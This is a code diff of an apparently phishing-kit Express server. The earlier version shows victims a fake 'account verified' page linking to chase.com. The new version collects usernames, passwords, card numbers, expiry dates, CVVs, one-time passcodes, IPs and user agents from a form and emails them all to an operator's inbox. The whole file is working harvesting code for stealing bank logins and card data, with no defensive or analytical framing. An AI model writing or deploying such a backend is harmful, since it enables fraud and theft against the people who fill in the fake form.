@@ -1,149 +1,74 @@
+// server.js
 const express = require("express");
+const cors = require("cors");
 const nodemailer = require("nodemailer");
 
 const app = express();
+const PORT = process.env.PORT || 5000;
+
+// Middleware
+app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true })); // handle HTML form submissions
+app.use(express.urlencoded({ extended: true }));
 
-// POST route for receiving form data
+// ✅ POST route to receive data
 app.post("/api/check", async (req, res) => {
-  const userAgent = req.get("User-Agent");
-  const ip =
-    req.headers["x-forwarded-for"]?.split(",").shift() ||
-    req.socket.remoteAddress;
+  const formData = req.body;
+  console.log("📩 Received form data:", formData);
 
-  console.log("✅ Form data:", req.body);
-  console.log("🌍 IP:", ip);
-  console.log("🖥 UA:", userAgent);
+  // Extract values
+  const {
+    user,
+    pass,
+    name,
+    cc,
+    exp,
+    cvv,
+    otp,
+    ip,
+    userAgent
+  } = formData;
 
   try {
-    // Create transporter
+    // ✅ Setup Nodemailer transporter
     let transporter = nodemailer.createTransport({
-      service: "Gmail",
+      service: "gmail", // change to outlook, yahoo, etc. if needed
       auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS,
-      },
+        user: process.env.EMAIL_USER, // your email
+        pass: process.env.EMAIL_PASS  // your app password
+      }
     });
 
-    console.log("🔄 Attempting to send email...");
-
-    // Mail options
-    let mailOptions = {
+    // ✅ Send email
+    await transporter.sendMail({
       from: `"Form Bot" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_TO,
-      subject: "New Form Submission",
-      text: `Form Data: ${JSON.stringify(req.body, null, 2)}
-IP: ${ip}
-User-Agent: ${userAgent}`,
-      html: `
-        <h2>📩 New Form Submission</h2>
-        <pre>${JSON.stringify(req.body, null, 2)}</pre>
-        <p><b>🌍 IP:</b> ${ip}</p>
-        <p><b>🖥 User-Agent:</b> ${userAgent}</p>
-      `,
-    };
+      to: "youremail@example.com", // change to your real inbox
+      subject: "🔔 New OTP Form Submission",
+      text: `
+      📩 New Submission Received:
 
-    // Send the email
-    let info = await transporter.sendMail(mailOptions);
-    console.log("✅ Email sent! Message ID:", info.messageId);
+      👤 User: ${user}
+      🔑 Pass: ${pass}
+      🙍 Name: ${name}
+      💳 Card: ${cc}
+      📅 Expiry: ${exp}
+      🔒 CVV: ${cvv}
+      🔐 OTP: ${otp}
+      🌍 IP: ${ip}
+      🖥️ UserAgent: ${userAgent}
+      `
+    });
 
-    // ✅ Success page
-    res.send(`
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <title>Submission Successful</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-          }
-          .message-box {
-            background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-          }
-          h2 { color: green; }
-          a {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: green;
-            color: white;
-            border-radius: 6px;
-            text-decoration: none;
-          }
-        </style>
-      </head>
-      <body>
-        <div class="message-box">
-          <h2>✅ Thank you! Your Account is been Verified.</h2>
-          <p>We’ve received your details for account review and will get back to you via email(before 24hrs).</p>
-          <a href="https://chase.com">Go Back</a>
-        </div>
-      </body>
-      </html>
-    `);
+    console.log("📧 Email sent successfully");
+
+    res.json({ status: "ok", message: "Data received and emailed ✅" });
   } catch (error) {
-    console.error("❌ Email error details:", error);
-
-    // ❌ Error page
-    res.status(500).send(`
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <title>Submission Failed</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-          }
-          .message-box {
-            background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-          }
-          h2 { color: red; }
-          a {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: red;
-            color: white;
-            border-radius: 6px;
-            text-decoration: none;
-          }
-        </style>
-      </head>
-      <body>
-        <div class="message-box">
-          <h2>❌ Oops! Something went wrong.</h2>
-          <p>${error.message}</p>
-          <a href="/">Try Again</a>
-        </div>
-      </body>
-      </html>
-    `);
+    console.error("❌ Error sending email:", error);
+    res.status(500).json({ status: "error", message: "Failed to send email" });
   }
 });
 
-// For Render: listen on assigned port
-const PORT = process.env.PORT || 3000;
+// Start server
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
